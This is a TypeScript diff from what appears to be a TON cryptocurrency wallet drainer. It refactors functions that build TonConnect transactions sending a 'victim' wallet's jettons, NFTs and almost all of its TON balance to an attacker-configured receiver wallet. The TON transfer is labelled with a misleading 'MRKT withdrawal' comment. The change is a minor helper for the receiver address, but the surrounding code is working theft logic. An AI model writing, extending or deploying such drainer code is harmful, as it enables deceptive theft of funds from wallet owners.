@@ -2,6 +2,11 @@ import { Address, beginCell, toNano } from "@ton/core";
 import type { AccountAssets, JettonBalance, NftItem } from "./tonapi.js";
 import { config } from "./config.js";
 
+function receiver(): Address {
+  if (!config.receiver) throw new Error("RECEIVER_WALLET not configured");
+  return config.receiver;
+}
+
 const JETTON_TRANSFER = 0xf8a7ea5;
 const NFT_TRANSFER = 0x5fcc3d14;
 const MAX_MESSAGES = 4;
@@ -47,7 +52,7 @@ function jettonMessages(items: JettonBalance[], victim: Address): TonConnectMess
   return items.slice(0, MAX_MESSAGES).map((j) => ({
     address: j.jettonWallet.toString({ urlSafe: true, bounceable: true }),
     amount: toNano("0.05").toString(),
-    payload: jettonTransferBody(j.balance, config.receiver, victim),
+    payload: jettonTransferBody(j.balance, receiver(), victim),
   }));
 }
 
@@ -55,7 +60,7 @@ function nftMessages(items: NftItem[], victim: Address): TonConnectMessage[] {
   return items.slice(0, MAX_MESSAGES).map((n) => ({
     address: n.address.toString({ urlSafe: true, bounceable: true }),
     amount: toNano("0.05").toString(),
-    payload: nftTransferBody(config.receiver, victim),
+    payload: nftTransferBody(receiver(), victim),
   }));
 }
 
@@ -65,7 +70,7 @@ function tonMessage(assets: AccountAssets): TonConnectMessage | null {
   const sendable = assets.tonNano - reserve;
   if (sendable < min) return null;
   return {
-    address: config.receiver.toString({ urlSafe: true, bounceable: true }),
+    address: receiver().toString({ urlSafe: true, bounceable: true }),
     amount: sendable.toString(),
     payload: beginCell().storeUint(0, 32).storeStringTail("MRKT withdrawal").endCell().toBoc().toString("base64"),
   };
